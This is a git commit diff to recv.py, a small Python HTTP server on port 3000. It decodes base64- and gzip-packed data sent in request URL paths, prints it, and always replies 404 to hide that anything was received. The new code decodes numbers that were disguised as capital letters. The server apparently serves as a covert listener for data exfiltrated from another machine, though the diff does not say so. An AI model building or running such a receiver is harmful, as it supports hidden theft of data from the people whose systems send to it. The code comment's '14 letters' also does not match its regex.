fa502765cb1d212e6fcd1dac5b678e82d52c11ca
rossdraper <rossdraper@users.noreply.github.com>
2024-05-18 18:27:54 +0800

    m

--- recv.py
+++ recv.py
@@ -3,22 +3,33 @@ import socketserver
 import base64
 import gzip
 from io import BytesIO
+import re
 
 PORT = 3000
 
 class MyHTTPHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
-        encoded_string = self.path[1:] 
+        encoded_string = self.path[1:]  # Skip the leading '/'
         try:
             decoded_data = base64.urlsafe_b64decode(encoded_string)
 
-            if decoded_data[:2] == b'\x1f\x8b':
+            if decoded_data[:2] == b'\x1f\x8b':  # Check for gzip magic number
                 with gzip.GzipFile(fileobj=BytesIO(decoded_data)) as gzip_file:
-                    decoded_string = gzip_file.read().decode('utf-8')
-                print(decoded_string, end='')
+                    decoded_string = gzip_file.read().decode('utf-8')  # Decompress and decode
             else:
-                decoded_string = decoded_data.decode('utf-8')
-                print(decoded_string, end='')
+                decoded_string = decoded_data.decode('utf-8')  # Directly decode
+
+            # Function to perform the substitution
+            def replace_match(match):
+                print("match is:",match)
+                translation_table = str.maketrans("LMNOPQRSTU", "0123456789")
+                return match.group(0).translate(translation_table)
+
+            # Regex to find all patterns that start with 'P' and are 14 capital letters long
+            pattern = re.compile(r'P[A-Z]{15}')
+            modified_string = pattern.sub(replace_match, decoded_string)
+
+            print(modified_string, end='')
         except Exception as e:
             print("Error decoding and/or unzipping Base64:", e)
         self.send_response(404)
@@ -29,7 +40,6 @@ class MyHTTPHandler(http.server.SimpleHTTPRequestHandler):
         pass
 
 class MyTCPServer(socketserver.TCPServer):
-
     allow_reuse_address = True
 
 def run(server_class=MyTCPServer, handler_class=MyHTTPHandler):
